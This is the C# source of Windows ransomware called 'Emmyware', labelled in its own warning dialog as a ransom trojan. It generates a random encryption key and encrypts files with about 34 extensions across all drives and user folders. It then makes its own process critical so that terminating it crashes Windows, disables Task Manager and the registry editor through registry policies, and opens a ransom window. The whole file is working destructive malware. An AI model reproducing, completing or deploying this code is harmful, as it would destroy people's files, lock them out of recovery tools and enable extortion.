using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Emmyware
{
    public static class Program
    {
        static string Hello = new string("Hi fellow decompilers! I hope you guys have a wonderful day, as I am right now. -EmmyMalware, 5.17.2025".ToCharArray());

        // File extensions that Emmyware searches for and then encrypts
        private static readonly string[] targetExtensions = new string[]
        {
            ".jpg",  ".txt",
            ".png",  ".pdf",
            ".hwp",  ".psd",
            ".cs",   ".c",
            ".cpp",  ".vb",
            ".bas",  ".frm",
            ".mp3",  ".wav",
            ".flac", ".gif",
            ".doc",  ".xls",
            ".xlsx", ".docx",
            ".ppt",  ".pptx",
            ".js",   ".avi",
            ".mp4",  ".mkv",
            ".zip",  ".rar",
            ".alz",  ".egg",
            ".7z",   ".raw",
            ".h",    ".sln"
        };

        internal static List<string> encryptedFiles = new List<string>();

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
        public static int isCritical = 1;
        public static int BreakOnTermination = 0x1D;

        public static void DoEncryptionShit()
        {
            EncryptionLogic.randomIV = new byte[16];
            EncryptionLogic.randomKey = new byte[32];

            RNGCryptoServiceProvider rngcryptoServiceProvider = new RNGCryptoServiceProvider();
            rngcryptoServiceProvider.GetBytes(EncryptionLogic.randomIV);  // Generate the IV
            rngcryptoServiceProvider.GetBytes(EncryptionLogic.randomKey); // Generate the key

            string[] logicalDrives = Environment.GetLogicalDrives();
            string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            foreach(string daDrive in logicalDrives)
            {
                if (folderPath.Contains(daDrive)) // Check if the drive has the Windows system folder.
                {
                    // Most of the time, it is a Windows Drive. Check the users folder
                    foreach (string path in Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\.."))
                    {
                        try
                        {
                            foreach (string fileName in Directory.GetFiles(path, "*.*", SearchOption.AllDirectories))
                            {
                                foreach (string fileExt in targetExtensions)
                                {
                                    if (fileName.EndsWith(fileExt))
                                    {
                                        EncryptionLogic.Crypt(fileName, false);
                                        encryptedFiles.Add(fileName + ".emmy");
                                    }
                                }
                            }
                        }
                        catch (Exception ex)
                        {
                            ExceptionLogger.Log(ex);
                        }
                    }
                }
                else
                {
                    foreach (string fileName in Directory.GetFiles(daDrive))
                    {
                        try
                        {
                            foreach (string fileExt in targetExtensions)
                            {
                                if (fileName.EndsWith(fileExt))
                                {
                                    EncryptionLogic.Crypt(fileName, false);
                                    encryptedFiles.Add(fileName + ".emmy");
                                }
                            }
                        }
                        catch (Exception ex)
                        {
                            ExceptionLogger.Log(ex);
                        }
                    }

                    foreach (string zeFolders in Directory.GetDirectories(daDrive))
                    {
                        try
                        {
                            foreach (string fileName in Directory.GetFiles(zeFolders, "*.*", SearchOption.AllDirectories))
                            {
                                foreach (string fileExt in targetExtensions)
                                {
                                    if (fileName.EndsWith(fileExt))
                                    {
                                        EncryptionLogic.Crypt(fileName, false);
                                        encryptedFiles.Add(fileName + ".emmy");
                                    }
                                }
                            }
                        }
                        catch (Exception ex)
                        {
                            ExceptionLogger.Log(ex);
                        }
                    }
                }
            }
        }

        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            if (MessageBox.Show("Once you run this, you're fucked!", "Trojan.Ransom.Emmyware", MessageBoxButtons.OKCancel, MessageBoxIcon.Warning) == DialogResult.OK)
            {
                DoEncryptionShit();
                Process.EnterDebugMode();
                NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
                RegistryKey distaskmgr = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                distaskmgr.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
                RegistryKey disregedit = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                disregedit.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
                Application.Run(new RansomFrm());
            }
        }
    }
}
